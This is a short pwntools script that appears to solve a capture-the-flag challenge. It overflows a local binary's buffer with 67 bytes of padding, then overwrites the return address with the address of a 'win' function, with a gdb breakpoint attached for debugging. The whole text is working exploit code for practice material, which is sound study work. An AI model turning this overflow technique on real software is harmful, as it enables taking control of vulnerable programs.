from pwn import *

binary = "./pwn2"

r = process(binary)
e = ELF(binary)

win = p32(e.symbols['win'])
gdb.attach(r,"""
    b * main + 68
    c
""")
r.recv()
payload = flat("A"*67, win)
r.sendline(payload)
r.interactive()
